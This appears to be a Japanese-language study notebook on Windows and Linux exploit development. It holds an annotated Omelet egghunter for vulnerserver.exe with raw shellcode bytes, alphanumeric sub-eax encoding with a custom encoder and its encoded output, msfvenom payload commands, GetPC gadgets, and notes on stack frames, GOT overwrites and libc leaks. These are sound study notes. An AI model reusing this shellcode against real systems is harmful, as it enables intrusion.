egg2 = "\x55\xFD\x55\xDA\xBA\xF2\xCA\x66\x7B\xC3\x41\xE9\xFC\xDC\x83\x4E\xF2\x96\x8E\xE6\x9B\x7E\x5B\xBB\xC1\x80\xB1\xFF\xFF\x02\x30\x7F\x04\x1A\x31\x7A\x40\x9C\xA9\xF6\xD9\x49\xCE\xA5\xDA\x5B\xAD\x28\x49\x07\x1C\xCF\xE9\xA2\x60\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40";
```
vulnserver.exeで動作したOmlet-Hunterは以下。   
```txt
   0:	83 e9 78             	sub    ecx,0x78 ; ECXがEggより高いアドレスだったため、
   3:	83 e9 78             	sub    ecx,0x78 ; ecx-562することで、Eggより低いアドレスに設定
   6:	83 e9 78             	sub    ecx,0x78 ; こうすると、Eggの近くから検索が開始されるので早く見つけられる！
   9:	83 e9 78             	sub    ecx,0x78
   c:	83 e9 52             	sub    ecx,0x52 
   f:	89 cf                	mov    edi,ecx  ; ediが0x0の場合だと、0x00000000を参照しようとしてAccess-Violationとなった
                                            ; そのため、ECXを活用して恣意的にEggの近くから探索を始めるようにする
  11:	bb fd ff ff ff       	mov    ebx,0xfffffffd ; eggをすべて見つけた後でもループが終わらず、権限のないアドレスを参照
                                                  ; してAccess-Violationとなったため、3回分のEggをカウントするようにする
                                                  ; 0xffffffff-egg_size+1 をほかで使用してないEBXに代入
  16:	eb 29                	jmp    0x41     ; [1]にジャンプ(SEHがうんたらかんたら？？)
  18:	51                   	push   ecx      ; [3] <- jmp先
  19:	64 89 20             	mov    DWORD PTR fs:[eax],esp
  1c:	fc                   	cld    
  1d:	b0 55                	mov    al,0x55  ; 0x55回、1バイトずつEggの指す分割Shellcodeからスタックに値をコピーする
  1f:	f2 ae                	repnz scas al,BYTE PTR es:[edi] ; ediが0x1増える？よくわかってない…
  21:	50                   	push   eax
  22:	89 fe                	mov    esi,edi ; この時のediのアドレスがちょうどEggを指していればEggを発見できる
  24:	ad                   	lods   eax,DWORD PTR ds:[esi] ; Eggかもしれない値をEaxに代入
  25:	35 ff 55 da ba       	xor    eax,0xbada55ff ; eaxの値が0xbada55ffならEgg発見！
  2a:	83 f8 03             	cmp    eax,0x3
  2d:	77 12                	ja     0x41   ; [1]にジャンプ(Eggは発見できない場合)
  2f:	59                   	pop    ecx ; Eggを発見した場合、以下の処理を実行
  30:	f7 e9                	imul   ecx
  32:	64 03 42 08          	add    eax,DWORD PTR fs:[edx+0x8]
  36:	97                   	xchg   edi,eax
  37:	f3 a4                	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi] ; 0x55回、1バイトずつスタックの最後にShellcodeの一部を書き込む
  39:	83 fb ff             	cmp    ebx,0xffffffff  ; ebx=0xfffffffdが2回incされると、合計3個分発見したことになり、Shellcodeにジャンプ
  3c:	74 2e                	je     0x6c     ; [5]にジャンプ(shellcode用の処理にジャンプ)
  3e:	43                   	inc    ebx ; 0xfffffffdに0x1を足す。3個分のEggをカウントする
  3f:	89 f7                	mov    edi,esi
  41:	31 c0                	xor    eax,eax    ; [1] <- jmp先
  43:	64 8b 08             	mov    ecx,DWORD PTR fs:[eax]
  46:	89 cc                	mov    esp,ecx    ; [2] <- jmp先
  48:	59                   	pop    ecx
  49:	81 f9 ff ff ff ff    	cmp    ecx,0xffffffff ; SEHの最後の例外ハンドラの0xffffffffかどうか確認してる？
  4f:	75 f5                	jne    0x46      ; [2]にジャンプ
  51:	5a                   	pop    edx
  52:	e8 c1 ff ff ff       	call   0x18   ; [3]にジャンプ(次のアドレスでEggを探す)
  57:	61                   	popa          ; ここら辺に到達することなくね？？と思ってる。全然わからん…
  　　　　　　　　　　　　　　　　　　　　　　; ここから、[5]まで省いても問題なくShellcode実行まで行けたわ…
                                          ; 多分、魔改造した結果必要なくなったっぽい？？
  58:	8d 66 18             	lea    esp,[esi+0x18]
  5b:	58                   	pop    eax
  5c:	66 0d ff 0f          	or     ax,0xfff
  60:	40                   	inc    eax
  61:	78 03                	js     0x66   ; [4]にジャンプ
  63:	97                   	xchg   edi,eax
  64:	eb db                	jmp    0x41   ; [1]にジャンプ
  66:	31 c0                	xor    eax,eax ; [4] <- jmp先
  68:	64 ff 50 08          	call   DWORD PTR fs:[eax+0x8] ; ここらへんはよくわからん
  6c:	c1 ef 08             	shr    edi,0x8  ; [5] <- jmp先 Ediがshellcodeを指すように調整
  6f:	c1 e7 08             	shl    edi,0x8
  72:	ff e7                	jmp    edi      ; ediの指すShellcodeにジャンプして実行！

\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9R\x89\xcf\xbb\xfd\xff\xff\xff\xeb)Qd\x89\xfc\xb0U\xf2\xaeP\x89\xfe\xad5\xffU\xda\xba\x83\xf8\x03w\x12Y\xf7\xe9d\x03B\x08\x97\xf3\xa4\x83\xfb\xfft.C\x89\xf71\xc0d\x8b\x08\x89\xccY\x81\xf9\xff\xff\xff\xffu\xf5Z\xe8\xc1\xff\xff\xffa\x8df\x18Xf\r\xff\x0f@x\x03\x97\xeb\xdb1\xc0d\xffP\x08\xc1\xef\x08\xc1\xe7\x08\xff\xe7

以下の省略版のOmlet-HunterでもShellcode実行まで行けた！！
相対JMPとかをうまく行くように調整したりした。
\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9R\x89\xcf\xbb\xfd\xff\xff\xff\xeb)Qd\x89\xfc\xb0U\xf2\xaeP\x89\xfe\xad5\xffU\xda\xba\x83\xf8\x03w\x12Y\xf7\xe9d\x03B\x08\x97\xf3\xa4\x83\xfb\xfft\x19C\x89\xf71\xc0d\x8b\x08\x89\xccY\x81\xf9\xff\xff\xff\xffu\xf5Z\xe8\xc1\xff\xff\xff\xc1\xef\x08\xc1\xe7\x08\xff\xe7
```
SEH Omlet shellcodeは以下からダウンロードできる。   
https://code.google.com/archive/p/w32-seh-omelet-shellcode/downloads   
### Alpha shellcode
ファイル名に使える文字しか使えないような場合、`0x21~0x7f`らへんしか使用できない。   

その場合は、`mefvenom`の`x86/alpha_mixed`などでこれらの文字だけを使ってShellcodeを構成する必要がある。   
しかし、単純に`msfvenom`を実行するだけだとDecoderの部分に使用できない文字が含まれたままになるので、`BufferRegister=ESP`などで、事前にそのShellcodeのアドレスが`ESP`などの指定したレジスタに代入されるようにする！   

#### badchars
```txt
0x7fより大きい場合にどう変更されるのか、事前にmonaで調べておいた方がよさそう！

    |                                               | Memory
 50 |71 72 73 74 75 76 77 78 79 7a 7b 7d 7e 7f 80 81| File
    |                                          c7 fc| Memory
 60 |82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90 91| File
    |e9 e2 e4 e0 e5 e7 ea eb e8 ef ee ec c4 c5 c9 e6| Memory
 70 |92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0 a1| File
    |c6 f4 f6 f2 fb f9 ff d6 dc a2 a3 a5 50 83 e1 ed| Memory
 80 |a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0 b1| File
    |f3 fa f1 d1 aa ba bf ac ac bd bc a1 ab bb a6 a6| Memory
 90 |b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0 c1| File
    |a6 a6 a6 a6 a6 2b 2b a6 a6 2b 2b 2b 2b 2b 2b 2d| Memory
 a0 |c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0 d1| File
    |2d 2b 2d 2b a6 a6 2b 2b 2d 2d a6 2d 2b 2d 2d 2d| Memory
 b0 |d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0 e1| File
    |2d 2b 2b 2b 2b 2b 2b 2b 2b a6 5f a6 a6 af 61 df| Memory
 c0 |e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0 f1| File
    |47 70 53 73 b5 74 46 54 4f 64 38 66 65 6e 3d b1| Memory
 d0 |f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff      | File
    |3d 3d 28 29 f7 98 b0 b7 b7 76 6e b2 a6 a0      | Memory
    `-----------------------------------------------'

```
#### GetPC
NULLbyteが可能なら、`call $+0x5`が有効かも。   
```txt
nasm > call $+0x5
00000000  E800000000        call 0x5

call命令でcall 0x5の次の命令のアドレスがスタックにpushされる。
つまり、call命令実行後はEIPとESPが同じアドレスを示すようになる！
```
仮に、`0x7f`以上の文字が完全に別の文字に変換されるとして、その変換対応を把握すれば運が良ければGetPCが書けるかもしれない！   
```txt
!mona getpc -r eax
  eaxに現在のスタック上のアドレスを代入する一連の処理をいくつか挙げてくれる。デコード時に便利
  eax|  jmp short back:
  "\xeb\x03\x58\xff\xd0\xe8\xf8\xff\xff\xff"
  eax|  call + 4:
  "\xe8\xff\xff\xff\xff\xc3\x58"
  eax|  fstenv:
  "\xd9\xeb\x9b\xd9\x74\x24\xf4\x58"
  
   0:	eb 03                	jmp    0x5　; [1] objdumpではjmp 0x5は左の5:の番号に相対ジャンプすることを指す
   2:	58                   	pop    eax  ; [3] call時にスタックに保存したcall 0x2の次のアドレスをeaxに代入
   3:	ff d0                	call   eax  ; [4] call 0x2の次の命令に復帰。EAXにはその命令のアドレスがあり目標達成
   5:	e8 f8 ff ff ff       	call   0x2　; [2] 2:の処理(pop eax)にjmp。命令自体はcall $-0x3
   
   0:	e8 ff ff ff ff       	call   0x4  ; 4バイト分callして次の命令が"\xff\xc3"(inc ebx)になりNOPとして働く
   5:	c3                   	ret         ; \xffと合体してinc ebx命令となる。inc ebxは"\x43"でも表せる？
   6:	58                   	pop    eax  ; 4:のアドレスをeaxに代入できる

   0:	d9 eb                	fldpi  
   2:	9b d9 74 24 f4       	fstenv [esp-0xc]
   7:	58                   	pop    eax
```
#### encode with sub eaxs
ASCIIでprint可能な`0x21~0x7f`で、それ以外の文字を置き換える方法。   
```txt
  まず、"\xff\xe4\x90\x90"(jmp esp)をencodeしたいとき、
0x9090e4ff       として逆順にする
  そして、二の補数を計算する。
0x6f6f1b01
  そして、0初期化されたeaxからsubを3回して、-0x16f6f1b01となるように3つの数字を調整する。
  まず、下位1バイトの01を考える。
  0x55 + 0x56 + 0x56 = 0x101 より、3つの数字の下位１バイトは
0x??????55
0x??????56
0x??????56
  となる。ここで、0x101なので桁上がりがあり、次の下位2バイト目を考えるときはこの桁上がりを考慮する必要がある。
  以下を同様にしていく…
  なお、後ろの4バイトの方から考える必要があることに注意！
  
# 参考　https://www.offensive-security.com/vulndev/quickzip-stack-bof-0day-a-box-of-chocolates/
```
この処理を自動化するスクリプトを作成した。なお、以下の文字はWindowsではファイル名に含められないため、これらを含まないようにEncodeする仕様となっている。微調整が必要な場合も、このスクリプトを基準にしたい。   
[custom encoder](script/)   
```txt
"  0x22    
*  0x2a
,  0x2c
/  0x2f
:  0x3a
;  0x3b
<  0x3c
>  0x3e
?  0x3f
\  0x5c
|  0x7c
```

ファイルの先頭に以下のようにEncodeしたいCodeをセットしておく。   
```python
import struct

################# User code begin ###################################################################
# You should edit only this section

egghunter = "\x31\xd2\x90\x90\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
egghunter += "w00t" # this is the marker/tag: w00t
egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# Make sure that finally using variable "shellcode"
shellcode = egghunter
################# User code end #####################################################################
```
これを実行すると、以下のように表示される。
```txt
global _start

section .text

_start:

; last4bytes :0xe7ffe775
; 2's complement :0x1800188b
; [+] 0: 0x27 0x31 0x33
; [+] 1: 0x5d 0x5d 0x5e
; [+] 2: 0x55 0x55 0x55
; [+] 3: 0x5d 0x5d 0x5d

; [+] Example
; [+] init eax ----------------------------------------------
                             and    eax,0x4e4e4d4a
                             and    eax,0x31313235
; [+] sub and set eax----------------------------------------
                             sub    eax,0x5d555d27
                             sub    eax,0x5d555d31
                             sub    eax,0x5d555e33
; [+] push eax-----------------------------------------------
                             push eax
```
この結果を`egghunter.asm`として保存してnasmでアセンブルするとほしいEncodeされたものをゲットできる！
```python
enc_egghunter = "\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x27\x5d\x55\x5d\x2d\x31\x5d\x55\x5d\x2d\x33\x5e\x55\x5d\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x70\x2d\x5a\x6f\x2d\x70\x2e\x5a\x70\x2d\x71\x2e\x61\x70\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x28\x7e\x79\x56\x2d\x29\x7f\x7d\x57\x2d\x2d\x7f\x7d\x57\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x5b\x6c\x28\x28\x2d\x5b\x6d\x29\x29\x2d\x5b\x6d\x2d\x2d\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x41\x53\x37\x27\x2d\x41\x53\x37\x31\x2d\x42\x54\x37\x33\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x54\x37\x66\x45\x2d\x55\x38\x66\x45\x2d\x55\x38\x66\x46\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x50\x2e\x2d\x31\x2d\x50\x47\x40\x32\x2d\x51\x48\x40\x32\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x33\x28\x67\x55\x2d\x33\x29\x67\x55\x2d\x34\x2d\x67\x55\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x45\x64\x7a\x7a\x2d\x45\x64\x7a\x7a\x2d\x45\x65\x7a\x7a\x50"

# 254bytes
# "%JMNN%5211-']U]-1]U]-3^U]P%JMNN%5211-p-Zo-p.Zp-q.apP%JMNN%5211-(~yV-)\x7f}W--\x7f}WP%JMNN%5211-[l((-[m))-[m--P%JMNN%5211-AS7'-AS71-BT73P%JMNN%5211-T7fE-U8fE-U8fFP%JMNN%5211-P.-1-PG@2-QH@2P%JMNN%5211-3(gU-3)gU-4-gUP%JMNN%5211-Edzz-Edzz-EezzP"
```
#### set EIP==REGISTER
**EIP==ESP**   
```txt
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed BufferRegister=ESP -f py -v exploit
でシェルコード実行前にESP==EIPとしておく

[方法1] 普通にShellcode分のスペースのあるスタック上にJMPする。
nasm > sub esp,0x200
00000000  81EC00020000      sub esp,0x200
nasm > jmp esp
00000000  FFE4              jmp esp
これをpush eaxsでEncodeした以下を使う。
# 52bytes
exploit += "\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x55\x55\x55\x5e\x2d\x55\x55\x55\x5e"
exploit += "\x2d\x56\x55\x56\x5e\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x29\x58\x54\x54\x2d\x29
exploit += "\x5a\x55\x54\x2d\x2d\x61\x55\x55\x50"

[方法2] popadで32バイト(0x20)分加算する
nasm > popad
00000000  61                popa
以下のように、ESPを高位のアドレスに上げる。[方法1]のEncodeされたやつを実行する直前はESPをそれより高くしておき、
|               |
|  enc_jmpesp   | <- これを実行すると、下(高いアドレス)に元のjmpespが復元される
|   nop(0x41)   | 
|    jmpesp     | <- 復元されたjmpespが現れる！このままNOPを降りていくとここを実行するようになる 
|   nop(0x41)   |
exploit += "\x61"*68 + "\x58"

[方法3] sub eaxを使ってespの値をeaxに代入してから任意に加算減算して、espに戻す。
        sub eaxのみが0x2dを使うためAlphaのみでも使用可能！sub espは"0x81"を使用するため使えない！
　　　　ただし、pop espの0x5cが"\"のため、多くの場合は使えない！
    例）eax = esp + 0x67c
    #>>> hex((0x10000067c)*-1 & 0xffffffff )
    #'0xfffff984'
    #>>> hex(0x5555532b*2 + 0x5555532e)
    #'0xfffff984'
nasm > push esp
00000000  54                push esp
nasm > pop eax
00000000  58                pop eax
nasm > sub eax,0x5555532b
00000000  2D2B535555        sub eax,0x5555532b
nasm > sub eax,0x5555532b
00000000  2D2B535555        sub eax,0x5555532b
nasm > sub eax,0x5555532e
00000000  2D2E535555        sub eax,0x5555532e
nasm > push eax
00000000  50                push eax
nasm > pop esp
00000000  5C                pop esp


eaxに入れたespの値に0x1234を加算したいとき、
>>> hex((0x100001234)*-1 & 0xffffffff )
'0xffffedcc'
>>> hex(0x55554f44*3)
'0xffffedcc'
より、0x55554f44を3回sub eaxする。

eaxに入れたespの値に0x1234を減算したいとき、
>>> hex(0x55555b66*2 + 0x55555b68)
'0x100001234'
より、sub eax,0x55555b66を2回、sub eax0x55555b68を1回する。
```
**EIP==EAX**   
```txt
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed BufferRegister=EAX -f py -v exploit
基本的には、EIP==ESPの[方法1][方法3]と同じ。
[方法3]の、任意の加算減算したEAXの値をESPに戻す処理が不要！
この場合、"0x5c"が含まれないため、動作する！！！！
    例）eax = esp + 0x67c
    #>>> hex((0x10000067c)*-1 & 0xffffffff )
    #'0xfffff984'
    #>>> hex(0x5555532b*2 + 0x5555532e)
    #'0xfffff984'
nasm > push esp
00000000  54                push esp
nasm > pop eax
00000000  58                pop eax
nasm > sub eax,0x5555532b
00000000  2D2B535555        sub eax,0x5555532b
nasm > sub eax,0x5555532b
00000000  2D2B535555        sub eax,0x5555532b
nasm > sub eax,0x5555532e
00000000  2D2E535555        sub eax,0x5555532e

```
#### Egghunter
EgghunterでShellcodeを見つけてそこに飛ぶ際に、`jmp edi`命令を使うため、`msfvenom`で`BufferRegister=EDI`を指定することでヒープ上にあるShellcodeを実行できる！(はず…)   
```txt
# Encode前のEgghunter。ファイル名の文字しか使えない場合、これではだめ
# 36bytes
egghunter = "\x31\xd2\x90\x90\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
egghunter += "w00t" # this is the marker/tag: w00t
egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# alpha3でエンコードしたEgghunter.直前にEIP==REGISTERとする必要がある
# python /opt/alpha3/ALPHA3.py x86 ascii mixedcase  esp --input="egghunter.bin" --verbose
# 102bytes
TYhffffk4diFkDql02Dqm0D1CuEE0t3r3t332t4r5N8L7l0p2F1n0p0m4C2v0p02060D5o4J01111n0D3k3Z3R0A395m133G4O3G02

# sub eaxを使ったEncodeをした場合、サイズがそこそこでかくなってしまう。あんまりよろしくない。
# sub eaxを使ったEncodeではjmp espとかの実行したい小さい命令だけにするべきそう
# 234bytes
%JMNN%5211-']U]-1]U]-3^U]P%JMNN%5211-p-Zo-p.Zp-q.apP%JMNN%5211-E'zV-E1}W-F3}WP%JMNN%5211-[l-E-[m-E-[m-EP%JMNN%5211-AS7'-AS71-BT73P%JMNN%5211-T7fE-U8fE-U8fFP%JMNN%5211-P.-1-PG@2-QH@2P%JMNN%5211-3(gU-3)gU-4-gUP%JMNN%5211-Edzz-Edzz-EezzP

```
## よく見るかたまり
#### 関数の先頭
```txt
Func1:
push arg1
push arg2
call Func2

Func2:
push ebp
mov ebp, esp
sub esp, 100h
```
```txt
call 直前    ->     push ebp 直前  ->  mov ebp, esp 直前  -> sub esp, 100h 直前   ->  sub esp, 100h 直後
(Low)
|      |            |        |         |         |          |         |              |         | __ esp 
|      |            |        |         |         |          |         |              |   ...   | 
|      |            |        |         |         |          |         |              |   100h  |
|      |            |        |         |         | __ esp   |         | __ esp,ebp   |   ...   | __ ebp
|      |            |        | __ esp  |saved_ebp|          |saved_ebp|              |saved_ebp|
|      | __ esp     | F1_ret |         | F1_ret  |          | F1_ret  |              | F1_ret  |
| arg1 |            |  arg1  |         |  arg1   |          |  arg1   |              |  arg1   | 
| arg2 |            |  arg2  |         |  arg2   |          |  arg2   |              |  arg2   |
| ...  | __ ebp     |  ...   | __ ebp  |   ...   | __ ebp   |   ...   |              |   ...   |
|      |            |        |         |         |          |         |              |         |
(High)
```
#### 関数の終わり
```txt
Func1:
push arg1
push arg2
call Func2

Func2:
...
mov esp,ebp
pop ebp
ret
```
```txt
mov esp,ebp 直前 -> pop ebp 直前        ->     ret 直前    ->     ret 直後   
(Low)
|         | __ esp  |         |             |         |         |         |
|   ...   |         |   ...   |             |   ...   |         |   ...   |
|   100h  |         |   100h  |             |   100h  |         |   100h  |
|   ...   | __ ebp  |   ...   | __ ebp,esp  |   ...   |         |   ...   |
|saved_ebp|         |saved_ebp|             |saved_ebp| __ esp  |saved_ebp|
| F1_ret  |         | F1_ret  |             | F1_ret  |         | F1_ret  | __ esp
|  arg1   |         |  arg1   |             |  arg1   |         |  arg1   |
|  arg2   |         |  arg2   |             |  arg2   |         |  arg2   |
|   ...   |         |   ...   |             |   ...   | __ ebp  |   ...   | __ ebp
|         |         |         |             |         |         |         |
(High)
```
#### main関数の状態

```txt
main関数は　<__libc_start_main+231> から呼ばれる。
saved_rbpは　0x400970 (<__libc_csu_init>)で以外と小さい
rbpは<__libc_csu_init>を指しており、その下にリターンアドレスがある

gdb-peda$ tel $rbp-0x30 20
0000| 0x7fffffffde60 --> 0x0 
0008| 0x7fffffffde68 --> 0x0 
0016| 0x7fffffffde70 --> 0x0 
0024| 0x7fffffffde78 --> 0x0 
0032| 0x7fffffffde80 --> 0x7fffffffdf70 --> 0x1 
0040| 0x7fffffffde88 --> 0x293133f802e74a00 
0048| 0x7fffffffde90 --> 0x400970 (<__libc_csu_init>:	push   r15)  <- rbpが指しているsaved_rbp
0056| 0x7fffffffde98 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax) <- リターンアドレス
0064| 0x7fffffffdea0 --> 0x1 
0072| 0x7fffffffdea8 --> 0x7fffffffdf78 --> 0x7fffffffe2b5 ("/home/takabaya-shi/environment/CTF-writeup/malleus-pwn/rot13/rot13")
0080| 0x7fffffffdeb0 --> 0x100008000 
0088| 0x7fffffffdeb8 --> 0x4007a2 (<main>:	push   rbp)
0096| 0x7fffffffdec0 --> 0x0 
0104| 0x7fffffffdec8 --> 0xd1145d117ed72115 
0112| 0x7fffffffded0 --> 0x400650 (<_start>:	xor    ebp,ebp)
0120| 0x7fffffffded8 --> 0x7fffffffdf70 --> 0x1 
0128| 0x7fffffffdee0 --> 0x0 
0136| 0x7fffffffdee8 --> 0x0 
0144| 0x7fffffffdef0 --> 0x2eeba26ed1772115 
0152| 0x7fffffffdef8 --> 0x2eebb2d1daa92115 
```
#### strcmp
```txt
   0x55555555529e <main+293>:	lea    rax,[rbp-0x90]
   0x5555555552a5 <main+300>:	lea    rsi,[rip+0xd81]        # 0x55555555602d
   0x5555555552ac <main+307>:	mov    rdi,rax
=> 0x5555555552af <main+310>:	call   0x555555555070 <strcmp@plt>
   0x5555555552b4 <main+315>:	test   eax,eax
   0x5555555552b6 <main+317>:	jne    0x5555555552dd <main+356>
```
`RSI`レジスタと`RDI`レジスタに比較したい文字列を代入して、一致しているかを見る。一致していなければ、JNEで不一致の処理に入る。
#### 変数

```txt
│           ; var char *s1 @ rbp-0x30

│           0x00400997      488d45d0       lea rax, [s1]         <- rsp-0x30のアドレスをraxに代入。getsの内容がここに書き込まれる
│           0x0040099b      4889c7         mov rdi, rax                ; char *s
│           0x0040099e      e88dfdffff     call sym.imp.gets           ; char *gets(char *s)

│      ││   0x004009ee      c745fc010000.  mov dword [var_4h], 1 <- rbp-0x4にある変数に1を代入
```


### 覚えておきたい
#### 方針
すぐに落ちるようなプログラムは`exit`などの最後の方にある関数のGOTを`main`や`_start`に書き換えてループさせる必要がある。   

そのあとに、putsやprintfを呼び出してlibc leakさせる(systemを呼び出したいがアドレスがわからない)。   
その際、   
- setbufなどの別の関数のGOTをprintf@pltに書き換えてsetbufをcallしてprintfを呼び出す   
printf(leakしたいアドレス)としたいので、書き換えるGOTは引数を伴うものがよい。  
printf@pltのアドレスは固定。   
- printf@plt(ランダム化されない)をリターンアドレスにセット(x86)   
すでに一度呼ばれた関数のGOTにはlibcのアドレスが書かれているので、引数にはGOT_addrをセットしてlibc leak   
- `pop rdi;ret`をリターンアドレスにセットしてROP gadget (x86-64)   
- すでに一度呼ばれた関数のGOTの下位バイトを書き換えて別のlibcの関数を呼びだす   

#### 起動時の動作
```txt
_start -> __libc_start_main -> main という流れ
mainでなくても_startでもループできる

gdb-peda$ bt
#0  0x00000000004007fe in main ()
#1  0x00007ffff7a05b97 in __libc_start_main (main=0x4007fa <main>, argc=0x1, 
    argv=0x7fffffffdf88, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, 
    stack_end=0x7fffffffdf78) at ../csu/libc-start.c:310
#2  0x000000000040070a in _start ()
```
#### 呼び出し規約
- x86の場合   
関数の引数はスタックに積まれる   
- x64の場合   
`rdi rsi	rdx	rcx	r8 r9`の順に引数としてレジスタが使われ、7個目以降はスタックが使われる。   
戻り値は`rax`が使用される。   

#### アドレス関係
```txt
libc_base        = addr_libc_mainarena - offset_libc_mainarena
libc_base        = libc_start_main - offset_libc_start_main
addr_libc_system    = libc_base + offset_libc_system
addr_libc_str_sh (/bin/sh)   = libc_base + offset_libc_str_sh
addr_libc_free_hook    = libc_base + offset_libc_free_hook
libc_gadget = libc_base + 0x4f2c5

(low)
|               |
|               |
|         0x251 | <- heap_base (不変)  0x555555757000
|               |
|0x555555757460 | <- tcache[0x120]の実体は0x250のchunkのどこかに存在
|               |
|               |
|         0x120 | <- 最後のチャンク 0x555555757460
|  AAAAA  AAAAA |
|   ~       ~   |
|  AAAAA  AAAAA |
|  AAAAA  20a00 | <- heap_top 0x555555757580
|               |    可変で下にどんどん伸びていく
|               |
|               |
|               |
|               | <- libc_base   0x7ffff79e4000 
|               |
|               | <- libc_start_main 0x7ffff7a05ab0
|               |
|               | <- libc_system 0x7ffff7a33440
|               |
|               | <- "/bin/sh"のポインタ 0x7ffff7b97e9a
|               |
|               | <- main_arena  0x7ffff7dcfc40
|               |
|               | <- fastbinsの実体 (0x80bytes以下)
|               |
|               | <- bins(unsortedbins)の実体 [main_arena+0x60]
|               |
|               |
|               |
|               | <- stack 0x7fffffffdea0
|               |
(high)
```
`0x7fffff...`はスタックのアドレス。`0x555555...`はスタックのアドレス、であることが多い(?)。
#### リトルエンディアン
`ABCDEF`という入力をした場合、   
```txt
gdb-peda$ x /4wx $rbp-0x90
0x7fffffffdd90:	0x44434241	0x00004645	0xf7ffe710	0x00007fff

gdb-peda$ x /2gx $rbp-0x90
0x7fffffffdd90:	0x0000716034647461	0x00007ffff7ffe710

         3  2  1  0
-> +0 | 44 43 42 41 |   (高)  7  6  5  4     3  2  1  0   (低)
-> +4 | 00 00 46 45 |   -> | 00 00 46 45 || 44 43 42 41 |

0| 41 |  入力      ABCDEF
1| 42 |  　    (低)上   下(高)
2| 43 |
3| 44 | 
4| 45 |
5| 46 |
6| 00 |
7| 00 |
8| ?? |

gdb-peda$ x /s $rbp-0x90
0x7fffffffdd90:	"ABCDEF"

RDI: 0x7fffffffdd90 --> 0x464544434241 ('ABCDEF')
```
メモリ上に格納される時、順序がこうなる。なお、文字列として読みだすときは順序が入力したときと同じに評価される。 

一方、アドレスは以下のように評価される。したがって、BOFでRIPを書き換えたりするときは、`10e7...ff7f`というように逆順に入力する必要がある。
```txt
gdb-peda$ x /gx $rbp-0x88
0x7fffffffdd98:	0x00007ffff7ffe710
```
```txt
[Immunit Debugger]風のスタック図
ESPがずれて表示される！

push 0x41424344後           　　push 0x0102後           push 0x0304               入力 "ABCD"
右下に表示されるスタック図
+08| 00 00 00 00 |　　　　　+06| 00 00 00 00 |         +04| 00 00 00 00 |         +00| 00 00 00 00 |
+0c| 00 00 00 00 |         +0a| 00 00 00 00 |         +08| 00 00 00 00 |         +04| 00 00 00 00 |
+10| 41 42 43 44 | <- esp  +0e| 43 44 01 02 | <- esp  +0c| 01 02 03 04 | <- esp  +08| 44 43 42 41 | <- esp
+14| 00 00 00 00 |         +12| 00 00 41 42 |         +10| 41 42 43 44 |         +0c| 01 02 03 04 |

08|    |                   08|    |                   08|    |                   08| 41 | <- esp+0
09|    |                   09|    |                   09|    |                   09| 42 |    esp+1
0a|    |                   0a|    |                   0a|    |                   0a| 43 |    esp+2
0b|    |                   0b|    |                   0b|    |                   0b| 44 |    esp+3
0c|    |                   0c|    |                   0c| 04 | <- esp+0          0c| 04 |
0d|    |                   0d|    |                   0d| 03 |    esp+1          0d| 03 |
0e|    |                   0e| 02 | <- esp+0          0e| 02 |    esp+2          0e| 02 | 
0f|    |                   0f| 01 |    esp+1          0f| 01 |    esp+3          0f| 01 | 
10| 44 |  <- esp+0         10| 44 |    esp+2          10| 44 |                   10| 44 | 
11| 43 |  　 esp+1         11| 43 |    esp+3          11| 43 |                   11| 43 | 
12| 42 |     esp+2         12| 42 |                   12| 42 |                   12| 42 |
13| 41 |     esp+3         13| 41 |                   13| 41 |                   13| 41 | 
14| 00 |                   14| 00 |                   14| 00 |                   14| 00 | 
15| 00 |                   15| 00 |                   15| 00 |                   15| 00 |
16| 00 |                   16| 00 |                   16| 00 |                   16| 00 |
17| 00 |                   17| 00 |                   17| 00 |                   17| 00 |
18| ?? |                   18| ?? |                   18| ?? |                   18| ?? |


ちなみに、右下のスタック図と左下のメモリDumpは読み方が違う！

右下のやつ
+00| 64 63 62 61 | abcd <- 右側が低いアドレス。ASCII表示するときは反転
+04| 00 00 66 65 | ed..
+08| 44 43 42 41 | ABCD
+0c| 48 47 46 45 | EFGH

左下のやつ
+00| 61 62 63 64 65 66 00 00 | abcdef.. <- 左側が低いアドレス。ASCII表示するときはそのまま(反転しない)
+08| 41 42 43 44 45 46 47 48 | ABCDEFGH

